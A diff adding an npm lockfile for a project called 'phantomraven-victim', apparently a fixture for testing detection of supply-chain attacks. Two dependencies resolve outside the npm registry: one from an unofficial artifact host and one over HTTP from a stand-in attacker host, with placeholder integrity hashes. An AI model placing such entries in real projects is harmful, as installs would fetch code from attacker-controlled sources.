@@ -1,0 +1,42 @@
+{
+  "name": "phantomraven-victim",
+  "version": "1.0.0",
+  "lockfileVersion": 3,
+  "requires": true,
+  "packages": {
+    "": {
+      "name": "phantomraven-victim",
+      "version": "1.0.0",
+      "dependencies": {
+        "express": "^4.18.2",
+        "lodash": "^4.17.21",
+        "phantomraven-bait": "^1.2.3",
+        "@helpful-utils/parser": "^2.0.0"
+      }
+    },
+    "node_modules/express": {
+      "version": "4.18.2",
+      "resolved": "https://registry.npmjs.org/express/-/express-4.18.2.tgz",
+      "integrity": "sha512-sa==",
+      "license": "MIT"
+    },
+    "node_modules/lodash": {
+      "version": "4.17.21",
+      "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz",
+      "integrity": "sha512-sa==",
+      "license": "MIT"
+    },
+    "node_modules/phantomraven-bait": {
+      "version": "1.2.3",
+      "resolved": "https://packages.storeartifact.com/phantomraven-bait/v1.2.3.tgz",
+      "integrity": "sha512-sa==",
+      "license": "MIT"
+    },
+    "node_modules/@helpful-utils/parser": {
+      "version": "2.0.0",
+      "resolved": "http://cdn.attacker.example/parser-2.0.0.tgz",
+      "integrity": "sha512-sa==",
+      "license": "MIT"
+    }
+  }
+}
